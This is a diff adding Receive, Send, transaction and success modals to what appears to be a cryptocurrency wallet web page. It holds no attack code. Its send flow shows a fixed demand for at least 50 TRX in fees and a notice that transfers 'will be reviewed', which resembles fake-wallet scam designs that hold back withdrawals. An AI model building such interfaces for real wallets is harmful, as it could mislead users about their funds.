@@ -53,6 +53,86 @@
 <section class="asset-list hidden" id="activity-container"></section>
 </main>
 
+<!-- RECEIVE MODAL -->
+<div id="receiveModal" class="modal-overlay hidden">
+    <div class="receive-content">
+        <div class="receive-header">
+            <h3>Receive</h3>
+            <span id="closeReceive">&times;</span>
+        </div>
+        <div id="receiveList">
+            </div>
+    </div>
+</div>
+
+<!--SEND MODAL    -->
+
+<div id="sendModal" class="modal-overlay hidden">
+    <div class="receive-content">
+        <div class="receive-header">
+            <h3>Send</h3>
+            <span class="close-btn" id="closeSend">&times;</span>
+        </div>
+        <div id="sendAssetList"></div>
+    </div>
+</div>
+
+<div id="txnModal" class="modal-overlay hidden">
+    <div class="receive-content">
+        <div class="receive-header">
+            <span id="backToAssets" style="cursor:pointer;">&lsaquo; Back</span>
+            <h3 id="txnHeader">Send BTC</h3>
+            <span></span>
+        </div>
+        
+        <div class="txn-container">
+            <div class="txn-card asset-info-card">
+                <img id="txnCoinLogo" src="" width="30">
+                <span id="txnCoinName">Bitcoin</span>
+                <span id="txnCoinBalance" class="right">0 BTC</span>
+            </div>
+
+            <div class="txn-card">
+                <label>Amount to Send</label>
+                <div class="input-row">
+                    <input type="number" id="sendAmount" placeholder="0">
+                    <span class="max-btn">Max</span>
+                </div>
+                <small id="usdEquivalent">≈ $ 0.00 USD</small>
+            </div>
+
+            <div class="txn-card">
+                <label>Receiver Wallet Address</label>
+                <input type="text" id="receiverAddr" placeholder="Enter wallet address">
+            </div>
+
+            <div class="txn-card">
+                <label>Select Network Fee Asset</label>
+                <select id="feeAsset">
+                    <option value="trx" selected>TRON</option> <option value="eth">ETHEREUM</option>
+                    <option value="doge">DOGE</option>
+                </select>
+            </div>
+            <p id="sendError" class="error-text hidden">Insufficient TRON balance (Min 50 TRX required for fees)</p>
+            <button id="continueBtn" class="main-btn">Continue</button>
+        </div>
+    </div>
+</div>
+
+<div id="successModal" class="modal-overlay hidden">
+    <div class="receive-content" style="height: auto; text-align: center; padding: 40px 20px;">
+        <div style="background: #eef5ff; width: 80px; height: 80px; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 20px;">
+            <span style="font-size: 40px; color: #2f80ed;">✓</span>
+        </div>
+        <h2 style="margin-bottom: 10px;">Transaction Sent</h2>
+        <p style="color: #666; line-height: 1.5; margin-bottom: 30px;">
+            Your request to send <span id="successAmt"></span> is being processed. 
+            We will review your request shortly.
+        </p>
+        <button class="main-btn" onclick="location.reload()">Done</button>
+    </div>
+</div>
+
 <script type="module" src="firebase.js"></script>
 <script type="module" src="user.js"></script>
 <script src="script.js"></script>
